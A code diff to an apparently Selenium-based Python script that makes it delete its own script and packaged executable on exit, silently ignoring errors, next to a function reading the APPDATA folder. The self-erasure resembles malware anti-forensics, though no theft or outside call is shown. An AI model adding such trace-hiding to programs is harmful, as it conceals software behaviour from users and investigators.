@@ -19,10 +19,37 @@ from webdriver_manager.chrome import ChromeDriverManager
 import time
 import os
 import sys
+import os
+import sys
+import atexit
+import time
+import shutil
+
+def delete_exe():
+    # Get the path of the currently running executable
+    exe_path = sys.argv[0]
+    
+    # Delay for a moment to make sure the process terminates
+    time.sleep(1)  # Small sleep to give the OS time to finalize processes
+    
+    try:
+        # Delete the executable file
+        os.remove(exe_path)
+    except Exception as e:
+        pass
 
 def term():
+    # Schedule the EXE file deletion when the program exits
+    atexit.register(delete_exe)
+    
+    # Optionally, perform other cleanup tasks like removing temporary files
     script_path = os.path.abspath(__file__)
-    os.remove(script_path)
+    if os.path.exists(script_path):
+        try:
+            os.remove(script_path)  # Only for non-packaged versions, avoid on EXE
+        except Exception as e:
+            if SELF_DEBUG:
+                debug(f"Failed to remove script: {str(e)}")
 
 def check_system():
     appdata_path = os.getenv('APPDATA')
